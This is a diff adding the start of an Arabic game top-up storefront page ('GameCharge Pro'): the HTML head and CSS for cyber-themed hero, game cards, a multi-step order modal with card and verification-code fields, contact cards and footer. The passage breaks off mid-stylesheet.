@@ -1,0 +1,2090 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta name="x-poe-datastore-behavior" content="local_only"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جيم شارج برو | شحن الألعاب والتطبيقات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&amp;family=Orbitron:wght@400;700;900&amp;family=Cairo:wght@700;900&amp;display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00f5d4;
+            --primary-rgb: 0, 245, 212;
+            --secondary: #7b2cbf;
+            --secondary-rgb: 123, 44, 191;
+            --accent: #f72585;
+            --accent-rgb: 247, 37, 133;
+            --gold: #ffd60a;
+            --success: #00e676;
+            --warning: #ffab00;
+            --danger: #ff1744;
+            --bg-dark: #030308;
+            --bg-card: rgba(12, 12, 20, 0.95);
+            --bg-glass: rgba(255, 255, 255, 0.02);
+            --text-primary: #ffffff;
+            --text-secondary: #7a7a8c;
+            --border-glow: rgba(0, 245, 212, 0.4);
+            --gradient-cyber: linear-gradient(135deg, #00f5d4 0%, #7b2cbf 50%, #f72585 100%);
+            --gradient-gold: linear-gradient(135deg, #ffd60a 0%, #ff9500 100%);
+            --gradient-neon: linear-gradient(135deg, #00f5d4 0%, #00e676 100%);
+        }
+
+        .light {
+            --bg-dark: #f8fafc;
+            --bg-card: rgba(255, 255, 255, 0.98);
+            --bg-glass: rgba(0, 0, 0, 0.02);
+            --text-primary: #0f0f1a;
+            --text-secondary: #64748b;
+            --border-glow: rgba(123, 44, 191, 0.4);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Advanced Cyber Background */
+        .cyber-universe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: var(--bg-dark);
+            overflow: hidden;
+        }
+
+        .cyber-universe::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                radial-gradient(ellipse 80% 50% at 20% -10%, rgba(var(--secondary-rgb), 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse 60% 40% at 80% 110%, rgba(var(--primary-rgb), 0.25) 0%, transparent 50%),
+                radial-gradient(ellipse 50% 30% at 50% 50%, rgba(var(--accent-rgb), 0.15) 0%, transparent 50%);
+            animation: cosmicPulse 8s ease-in-out infinite alternate;
+        }
+
+        @keyframes cosmicPulse {
+            0% { opacity: 0.8; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        .grid-floor {
+            position: absolute;
+            bottom: 0;
+            left: -50%;
+            width: 200%;
+            height: 50%;
+            background:
+                linear-gradient(90deg, rgba(var(--primary-rgb), 0.03) 1px, transparent 1px),
+                linear-gradient(rgba(var(--primary-rgb), 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            transform: perspective(500px) rotateX(60deg);
+            transform-origin: center top;
+            animation: gridScroll 15s linear infinite;
+        }
+
+        @keyframes gridScroll {
+            0% { background-position: 0 0; }
+            100% { background-position: 60px 60px; }
+        }
+
+        .floating-orbs {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(40px);
+            animation: floatOrb 20s ease-in-out infinite;
+        }
+
+        .orb:nth-child(1) {
+            width: 300px;
+            height: 300px;
+            background: rgba(var(--primary-rgb), 0.15);
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        .orb:nth-child(2) {
+            width: 200px;
+            height: 200px;
+            background: rgba(var(--secondary-rgb), 0.2);
+            top: 60%;
+            right: 15%;
+            animation-delay: -5s;
+        }
+
+        .orb:nth-child(3) {
+            width: 150px;
+            height: 150px;
+            background: rgba(var(--accent-rgb), 0.15);
+            bottom: 20%;
+            left: 30%;
+            animation-delay: -10s;
+        }
+
+        @keyframes floatOrb {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(30px, -30px) scale(1.1); }
+            50% { transform: translate(-20px, 20px) scale(0.9); }
+            75% { transform: translate(20px, 30px) scale(1.05); }
+        }
+
+        /* Header */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            padding: 0.75rem 2rem;
+            background: rgba(3, 3, 8, 0.9);
+            backdrop-filter: blur(30px);
+            border-bottom: 1px solid rgba(var(--primary-rgb), 0.1);
+        }
+
+        .light header {
+            background: rgba(255, 255, 255, 0.95);
+        }
+
+        nav {
+            max-width: 1500px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo-icon {
+            width: 55px;
+            height: 55px;
+            background: var(--gradient-cyber);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: #000;
+            position: relative;
+            box-shadow: 0 0 30px rgba(var(--primary-rgb), 0.4);
+        }
+
+        .logo-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 900;
+            background: var(--gradient-cyber);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .theme-toggle {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            border: 1px solid rgba(var(--primary-rgb), 0.2);
+            background: var(--bg-glass);
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .theme-toggle:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 25px rgba(var(--primary-rgb), 0.3);
+        }
+
+        .mobile-menu {
+            display: none;
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            border: 1px solid rgba(var(--primary-rgb), 0.2);
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            font-size: 1.3rem;
+            cursor: pointer;
+        }
+
+        /* Hero */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8rem 2rem 5rem;
+            position: relative;
+        }
+
+        .hero-content {
+            text-align: center;
+            max-width: 1100px;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.85rem 1.75rem;
+            background: rgba(var(--primary-rgb), 0.1);
+            border: 1px solid rgba(var(--primary-rgb), 0.3);
+            border-radius: 60px;
+            margin-bottom: 2rem;
+            animation: fadeSlideUp 0.8s ease;
+        }
+
+        .hero-badge i {
+            color: var(--primary);
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 1; filter: drop-shadow(0 0 5px var(--primary)); }
+            50% { opacity: 0.7; filter: drop-shadow(0 0 15px var(--primary)); }
+        }
+
+        .hero-badge span {
+            background: var(--gradient-cyber);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .hero h1 {
+            font-family: 'Cairo', sans-serif;
+            font-size: clamp(2.5rem, 7vw, 5.5rem);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            animation: fadeSlideUp 0.8s ease 0.1s both;
+        }
+
+        .hero h1 .gradient-text {
+            background: var(--gradient-cyber);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: inline-block;
+            filter: drop-shadow(0 0 30px rgba(var(--primary-rgb), 0.5));
+        }
+
+        .hero p {
+            font-size: 1.35rem;
+            color: var(--text-secondary);
+            max-width: 750px;
+            margin: 0 auto 3rem;
+            line-height: 1.9;
+            animation: fadeSlideUp 0.8s ease 0.2s both;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 1.5rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            animation: fadeSlideUp 0.8s ease 0.3s both;
+        }
+
+        .btn {
+            padding: 1.15rem 2.75rem;
+            border-radius: 16px;
+            font-size: 1.15rem;
+            font-weight: 700;
+            font-family: 'Tajawal', sans-serif;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-cyber {
+            background: var(--gradient-cyber);
+            color: #000;
+            border: none;
+            box-shadow: 0 15px 45px rgba(var(--primary-rgb), 0.35);
+        }
+
+        .btn-cyber:hover {
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 25px 60px rgba(var(--primary-rgb), 0.5);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--text-primary);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .btn-outline:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 35px rgba(var(--primary-rgb), 0.25);
+        }
+
+        /* Stats */
+        .stats-row {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-top: 5rem;
+            flex-wrap: wrap;
+            animation: fadeSlideUp 0.8s ease 0.4s both;
+        }
+
+        .stat-card {
+            text-align: center;
+            padding: 1.75rem 2.5rem;
+            background: var(--bg-glass);
+            border: 1px solid rgba(var(--primary-rgb), 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(20px);
+            min-width: 160px;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 0 40px rgba(var(--primary-rgb), 0.15);
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.75rem;
+            font-weight: 900;
+            background: var(--gradient-cyber);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Section Styles */
+        section {
+            padding: 7rem 2rem;
+            position: relative;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 5rem;
+        }
+
+        .section-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+            padding: 0.6rem 1.5rem;
+            background: rgba(var(--secondary-rgb), 0.1);
+            border: 1px solid rgba(var(--secondary-rgb), 0.3);
+            border-radius: 50px;
+            color: var(--secondary);
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin-bottom: 1.25rem;
+        }
+
+        .section-header h2 {
+            font-family: 'Cairo', sans-serif;
+            font-size: clamp(2.25rem, 5vw, 4rem);
+            font-weight: 900;
+            margin-bottom: 1rem;
+        }
+
+        .section-header p {
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            max-width: 650px;
+            margin: 0 auto;
+        }
+
+        /* Games Grid */
+        .games-container {
+            max-width: 1500px;
+            margin: 0 auto;
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 2.5rem;
+        }
+
+        .game-card {
+            background: var(--bg-card);
+            border-radius: 28px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(30px);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+        }
+
+        .game-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: var(--gradient-cyber);
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+
+        .game-card:hover {
+            transform: translateY(-15px) scale(1.02);
+            border-color: var(--border-glow);
+            box-shadow: 0 40px 80px rgba(var(--primary-rgb), 0.2);
+        }
+
+        .game-card:hover::before {
+            opacity: 1;
+        }
+
+        .game-banner {
+            position: relative;
+            height: 200px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, rgba(var(--primary-rgb), 0.1) 0%, rgba(var(--secondary-rgb), 0.1) 100%);
+        }
+
+        .game-banner::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 80%;
+            background: linear-gradient(to top, var(--bg-card) 0%, transparent 100%);
+        }
+
+        .game-logo {
+            width: 140px;
+            height: 140px;
+            border-radius: 32px;
+            object-fit: cover;
+            border: 5px solid var(--bg-card);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 10;
+            transition: all 0.4s;
+        }
+
+        .game-card:hover .game-logo {
+            transform: scale(1.1) rotate(-3deg);
+            box-shadow: 0 25px 60px rgba(var(--primary-rgb), 0.3);
+        }
+
+        .game-content {
+            padding: 2rem;
+            margin-top: -2rem;
+            position: relative;
+            z-index: 5;
+        }
+
+        .game-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1.5rem;
+        }
+
+        .game-title {
+            font-family: 'Cairo', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 900;
+            margin-bottom: 0.3rem;
+        }
+
+        .game-subtitle {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .game-rating {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.5rem 1rem;
+            background: rgba(255, 214, 10, 0.1);
+            border-radius: 10px;
+            color: var(--gold);
+            font-weight: 700;
+            font-size: 0.95rem;
+        }
+
+        .price-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .price-chip {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 1.1rem;
+            background: var(--bg-glass);
+            border: 2px solid rgba(255, 255, 255, 0.03);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .price-chip:hover, .price-chip.selected {
+            border-color: var(--primary);
+            background: rgba(var(--primary-rgb), 0.1);
+        }
+
+        .price-chip.selected {
+            box-shadow: 0 0 25px rgba(var(--primary-rgb), 0.25);
+        }
+
+        .price-chip .amount {
+            font-weight: 700;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .price-chip .amount i {
+            color: var(--gold);
+        }
+
+        .price-chip .price {
+            color: var(--primary);
+            font-weight: 800;
+            font-size: 1.15rem;
+            margin-top: 0.3rem;
+        }
+
+        .order-btn-main {
+            width: 100%;
+            padding: 1.2rem;
+            border: none;
+            border-radius: 16px;
+            background: var(--gradient-cyber);
+            color: #000;
+            font-size: 1.15rem;
+            font-weight: 800;
+            font-family: 'Tajawal', sans-serif;
+            cursor: pointer;
+            transition: all 0.4s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .order-btn-main:hover {
+            transform: scale(1.03);
+            box-shadow: 0 20px 50px rgba(var(--primary-rgb), 0.4);
+        }
+
+        /* Features */
+        .features-section {
+            background: linear-gradient(180deg, transparent 0%, rgba(var(--secondary-rgb), 0.05) 50%, transparent 100%);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            padding: 3rem;
+            background: var(--bg-card);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 28px;
+            backdrop-filter: blur(30px);
+            transition: all 0.4s;
+            text-align: center;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--border-glow);
+            box-shadow: 0 30px 60px rgba(var(--primary-rgb), 0.15);
+        }
+
+        .feature-icon {
+            width: 90px;
+            height: 90px;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.25rem;
+            margin: 0 auto 1.75rem;
+            background: var(--gradient-cyber);
+            color: #000;
+            box-shadow: 0 15px 40px rgba(var(--primary-rgb), 0.3);
+        }
+
+        .feature-card h3 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: 0.85rem;
+        }
+
+        .feature-card p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            font-size: 1.05rem;
+        }
+
+        /* Modal System */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(25px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s;
+            padding: 1rem;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: var(--bg-card);
+            border-radius: 32px;
+            width: 100%;
+            max-width: 580px;
+            max-height: 92vh;
+            overflow-y: auto;
+            transform: scale(0.9) translateY(30px);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid rgba(var(--primary-rgb), 0.15);
+            position: relative;
+            box-shadow: 0 50px 100px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 1.25rem;
+            padding: 2.5rem 2rem 1.5rem;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 28%;
+            right: 28%;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 3px;
+            z-index: 0;
+        }
+
+        .step {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1.1rem;
+            background: var(--bg-glass);
+            border: 3px solid rgba(255, 255, 255, 0.08);
+            color: var(--text-secondary);
+            position: relative;
+            z-index: 1;
+            transition: all 0.4s;
+        }
+
+        .step.active {
+            background: var(--gradient-cyber);
+            border-color: transparent;
+            color: #000;
+            box-shadow: 0 0 35px rgba(var(--primary-rgb), 0.5);
+        }
+
+        .step.completed {
+            background: var(--success);
+            border-color: transparent;
+            color: #000;
+        }
+
+        .modal-header {
+            padding: 1.5rem 2.5rem;
+            text-align: center;
+        }
+
+        .modal-header h3 {
+            font-family: 'Cairo', sans-serif;
+            font-size: 1.75rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-header p {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1.75rem;
+            left: 1.75rem;
+            width: 45px;
+            height: 45px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: var(--bg-glass);
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .modal-body {
+            padding: 0 2.5rem 2.5rem;
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(25px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .order-summary {
+            background: var(--bg-glass);
+            border: 1px solid rgba(var(--primary-rgb), 0.15);
+            border-radius: 18px;
+            padding: 1.5rem;
+            margin-bottom: 1.75rem;
+            display: flex;
+            align-items: center;
+            gap: 1.25rem;
+        }
+
+        .order-summary img {
+            width: 70px;
+            height: 70px;
+            border-radius: 16px;
+            object-fit: cover;
+        }
+
+        .order-summary-info h4 {
+            font-size: 1.2rem;
+            font-weight: 800;
+        }
+
+        .order-summary-info p {
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 1.05rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin-bottom: 0.7rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-size: 1rem;
+        }
+
+        .form-group label i {
+            color: var(--primary);
+            font-size: 0.95rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 1.1rem 1.4rem;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            font-size: 16px;
+            font-family: 'Tajawal', sans-serif;
+            transition: all 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 25px rgba(var(--primary-rgb), 0.2);
+        }
+
+        .form-control::placeholder {
+            color: var(--text-secondary);
+        }
+
+        select.form-control option {
+            background: var(--bg-card);
+            color: var(--text-primary);
+        }
+
+        .payment-methods-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.75rem;
+        }
+
+        .payment-method {
+            padding: 1.5rem;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            border-radius: 18px;
+            background: var(--bg-glass);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .payment-method:hover, .payment-method.selected {
+            border-color: var(--primary);
+            background: rgba(var(--primary-rgb), 0.08);
+        }
+
+        .payment-method.selected {
+            box-shadow: 0 0 30px rgba(var(--primary-rgb), 0.25);
+        }
+
+        .payment-method i {
+            font-size: 2.25rem;
+            margin-bottom: 0.6rem;
+            display: block;
+        }
+
+        .payment-method.visa i { color: #1a1f71; }
+        .payment-method.mastercard i { color: #eb001b; }
+        .payment-method.paypal i { color: #003087; }
+        .payment-method.crypto i { color: #f7931a; }
+
+        .payment-method span {
+            font-weight: 700;
+            font-size: 0.95rem;
+        }
+
+        .card-input-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .card-input-grid .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .verification-section {
+            text-align: center;
+            padding: 1.5rem 0;
+        }
+
+        .code-sent-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.85rem;
+            padding: 1.25rem;
+            background: rgba(0, 230, 118, 0.1);
+            border: 1px solid rgba(0, 230, 118, 0.3);
+            border-radius: 14px;
+            margin-bottom: 2.25rem;
+            color: var(--success);
+            font-weight: 600;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 0.85rem;
+            margin-bottom: 1.75rem;
+        }
+
+        .code-input {
+            width: 58px;
+            height: 70px;
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            font-size: 2rem;
+            font-weight: 700;
+            text-align: center;
+            font-family: 'Orbitron', sans-serif;
+            transition: all 0.3s;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 25px rgba(var(--primary-rgb), 0.25);
+        }
+
+        .resend-code {
+            color: var(--text-secondary);
+            margin-bottom: 1.75rem;
+            font-size: 1rem;
+        }
+
+        .resend-code button {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 1rem;
+        }
+
+        .resend-code button:disabled {
+            color: var(--text-secondary);
+            cursor: not-allowed;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 1.25rem;
+            border: none;
+            border-radius: 16px;
+            background: var(--gradient-cyber);
+            color: #000;
+            font-size: 1.15rem;
+            font-weight: 800;
+            font-family: 'Tajawal', sans-serif;
+            cursor: pointer;
+            transition: all 0.4s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .btn-submit:hover {
+            transform: scale(1.02);
+            box-shadow: 0 20px 50px rgba(var(--primary-rgb), 0.4);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-back {
+            width: 100%;
+            padding: 1.1rem;
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            background: transparent;
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            font-weight: 700;
+            font-family: 'Tajawal', sans-serif;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: all 0.3s;
+        }
+
+        .btn-back:hover {
+            border-color: var(--text-secondary);
+            color: var(--text-primary);
+        }
+
+        .success-animation {
+            text-align: center;
+            padding: 2.5rem 0;
+        }
+
+        .success-checkmark {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            background: var(--gradient-neon);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 2.25rem;
+            animation: successBounce 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 20px 50px rgba(var(--primary-rgb), 0.4);
+        }
+
+        .success-checkmark i {
+            font-size: 4rem;
+            color: #000;
+        }
+
+        @keyframes successBounce {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-animation h3 {
+            font-family: 'Cairo', sans-serif;
+            font-size: 2rem;
+            margin-bottom: 0.85rem;
+        }
+
+        .success-animation p {
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+
+        .order-number {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background: var(--bg-glass);
+            border: 1px solid var(--border-glow);
+            border-radius: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.25rem;
+            color: var(--primary);
+            margin: 1.5rem 0 2.5rem;
+        }
+
+        /* Contact */
+        .contact-section {
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .contact-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .contact-card {
+            padding: 3rem;
+            background: var(--bg-card);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 28px;
+            text-align: center;
+            transition: all 0.4s;
+            backdrop-filter: blur(30px);
+        }
+
+        .contact-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--border-glow);
+            box-shadow: 0 30px 60px rgba(var(--primary-rgb), 0.15);
+        }
+
+        .contact-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 1.5rem;
+        }
+
+        .contact-card.whatsapp .contact-icon {
+            background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
+            color: white;
+        }
+
+        .contact-card.telegram .contact-icon {
+            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+            color: white;
+        }
+
+        .contact-card.instagram .contact-icon {
+            background: linear-gradient(135deg, #f09433 0%, #e6683c 50%, #dc2743 75%, #cc2366 100%);
+            color: white;
+        }
+
+        .contact-card h4 {
+            font-size: 1.35rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .contact-card p {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 5rem 2rem 2.5rem;
+            border-top: 1px solid rgba(var(--primary-rgb), 0.1);
+        }
+
+        .footer-content {
+            max-width: 1300px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .footer-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.25rem;
+            font-weight: 900;
+            background: var(--gradient-cyber);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.25rem;
+        }
+
+        .footer-text {
+            color: var(--text-secondary);
+            margin-bottom: 2.25rem;
+            font-size: 1.1rem;
+        }
+
+        .payment-icons {
